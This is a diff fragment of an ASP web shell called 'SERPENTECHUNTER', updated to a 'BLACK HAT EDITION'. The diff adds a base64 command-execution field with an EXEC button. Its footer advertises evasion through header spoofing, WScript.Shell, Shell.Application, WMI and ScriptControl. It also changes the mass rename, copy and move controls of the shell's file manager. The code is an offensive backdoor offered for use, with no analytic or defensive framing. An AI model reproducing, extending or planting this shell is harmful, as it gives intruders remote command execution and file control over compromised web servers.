+            <input type="text" name="cmd" placeholder="💀 Command (b64:...)" style="flex:1;min-width:150px;">
             <button type="submit">▶ EXEC</button>
         </form>
         <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
@@ -967,7 +1174,7 @@ body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; f
                             End If
                         %>
                         <div class="file-item">
-                            <input type="checkbox" name="files[]" value="<%= Server.HTMLEncode(f(0)) %>" style="margin-right:8px;accent-color:#00ff00;">
+                            <input type="checkbox" name="files" value="<%= Server.HTMLEncode(f(0)) %>" style="margin-right:8px;accent-color:#00ff00;">
                             <span class="name <%= className %>">
                                 <%= icon %>
                                 <% If f(2) Then %>
@@ -1036,8 +1243,8 @@ body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; f
     </form>
 
     <div class="footer">
-        🐍 SERPENTECHUNTER v2.1 &nbsp;|&nbsp; © 2026 SerpentSecHunter (FIXED BY ZAMZZZ)<br>
-        <span style="font-size:10px;color:#444;">🔥 BYPASS: Header Spoofing | WScript.Shell | Shell.Application | WMI | EXPLOIT ENGINE</span>
+        🐍 SERPENTECHUNTER v3.0 &nbsp;|&nbsp; BLACK HAT EDITION (FIXED BY ZAMZZZ)<br>
+        <span style="font-size:10px;color:#444;">🔥 BYPASS: Base64 | Header Spoofing | WScript.Shell | Shell.App | WMI | ScriptControl</span>
     </div>
 </div>
 
@@ -1052,11 +1259,11 @@ function showToast(msg, isError) {
 showToast('<%= Replace(message, "'", "\'") %>');
 <% End If %>
 function selectAll() {
-    var cbs = document.querySelectorAll('input[name="files[]"]');
+    var cbs = document.querySelectorAll('input[name="files"]');
     for(var i=0; i<cbs.length; i++) cbs[i].checked = true;
 }
 function deselectAll() {
-    var cbs = document.querySelectorAll('input[name="files[]"]');
+    var cbs = document.querySelectorAll('input[name="files"]');
     for(var i=0; i<cbs.length; i++) cbs[i].checked = false;
 }
 function setMassAction(action) {
@@ -1074,7 +1281,7 @@ function singleRename(file) {
     }
 }
 function massRename() {
-    var files = document.querySelectorAll('input[name="files[]"]:checked');
+    var files = document.querySelectorAll('input[name="files"]:checked');
     if(files.length === 0) { showToast('Select files first', true); return; }
     var newNames = [];
     var valid = true;
@@ -1098,7 +1305,7 @@ function massRename() {
     form.submit();
 }
 function massCopy() {
-    var files = document.querySelectorAll('input[name="files[]"]:checked');
+    var files = document.querySelectorAll('input[name="files"]:checked');
     if(files.length === 0) { showToast('Select files first', true); return; }
     var dest = prompt('Destination directory (relative):');
     if(!dest) return;
@@ -1108,7 +1315,7 @@ function massCopy() {
     form.submit();
 }
 function massMove() {
-    var files = document.querySelectorAll('input[name="files[]"]:checked');
+    var files = document.querySelectorAll('input[name="files"]:checked');
     if(files.length === 0) { showToast('Select files first', true); return; }
     var dest = prompt('Destination directory (relative):');
     if(!dest) return;
